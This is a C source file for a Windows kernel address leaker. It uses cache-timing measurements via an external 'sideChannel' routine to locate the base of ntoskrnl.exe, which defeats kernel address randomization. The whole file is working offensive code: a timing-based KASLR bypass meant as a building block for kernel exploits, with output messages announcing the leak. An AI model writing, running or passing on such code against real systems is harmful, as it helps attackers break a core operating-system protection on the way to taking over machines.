#include <stdio.h>
#include <windows.h>

#define lowKernelBase  0xfffff80000000000
#define highKernelBase 0xfffff80800000000

#define KernelAddrJump 0x100000

#define Range 0x8000

extern "C" unsigned int sideChannel(void* baseAddress);
extern "C" void badSyscall(void);

UINT64 getNtBase() {
	static UINT64 Speed[Range] = { 0 };
	static UINT64 Addrs[Range] = { 0 };

	UINT64 Addr = lowKernelBase;
	unsigned int media = 0;
	UINT64 FinalAddress = 0;
	UINT64 FinalTime = 0;
	unsigned int CacheSpeed = 0;

	for (unsigned int Times = 0; Times < 0x100 + 5; Times++) {

		for (UINT64 index = 0; index < Range; index++) {

			if (!Addrs[index]) {
				Addrs[index] = 0xfffff80000000000 + index * 0x100000;
			}

			CacheSpeed = sideChannel((void*)Addrs[index]);

			if (Times >= 5) {
				Speed[index] += CacheSpeed;
			}
		}
	}

	unsigned int i = 0;
	for (i = 0; i < Range; i++) {
		Speed[i] /= 0x100;
	}

	int maxCount = 0;
	int averageSpeed = 0;
	for (i = 0; i < Range; i++) {

		int count = 0;
		for (unsigned int c = 0; c < Range; c++) {
			if (Speed[i] == Speed[c]) {
				count++;
			}
		}

		if (count > maxCount) {
			maxCount = count;
			averageSpeed = Speed[i];
		}
	}

	printf("\nAverage Speed -> %u", averageSpeed);

	unsigned int BaseSpeed1 = averageSpeed / 5;
	unsigned int BaseSpeed2 = averageSpeed / 10;

	// printf("\nBaseSpeed1 -> %u", BaseSpeed1);
	// printf("\nBaseSpeed2 -> %u\n", BaseSpeed2);

	for (UINT64 i = 0; i < 0x8000 - 0xc; i++)
	{
		int average = 0;
		for (UINT64 x = 0; x < 0xc; x++)
		{
			if (Speed[i + x] >= averageSpeed - BaseSpeed2)
			{
				average = -1;
				break;
			}
			average += Speed[i + x];
		}
		if (average == -1)
		{
			continue;
		}
		average /= 0xC;
		if (average < (averageSpeed - BaseSpeed1))
		{
			// printf("\n[Kernel Base] -> 0x%p\n\t\\__[Time] -> %u\n", 0xfffff80000000000 + (i * 0x100000), Speed[i]);
			// printf("\nAddr -> 0x%p", 0xfffff80000000000 + (i * 0x100000));
			return (FinalAddress = 0xfffff80000000000 + (i * 0x100000));
		}
	}

	return 0;
}

int main() {

	UINT64 Addr = 0;
	UINT64 Comp = 0;
	unsigned int i = 0;
	while (1) {
		printf("\n\n[INTEL CPU Based NT Base leaker] -> execution Number (%d)\n", i);

		if (i >= 1) {
			Sleep(1000);
		}

		if (((Addr = getNtBase())) == 0) {
			printf("\n\t[ERROR] Error getting the \"ntoskrnl.exe\" base!\n");
			i++;
			continue;
		}

		if (Addr != (getNtBase())) {
			printf("\n\t[ERROR] The address leaked is not the same! Repeating the process...\n");
			i++;
			continue;
		}
		else {
			break;
		}
	}

	printf("\n[\"ntoskrnl.exe\" base] -> 0x%p\n", Addr);

	return 0;
}
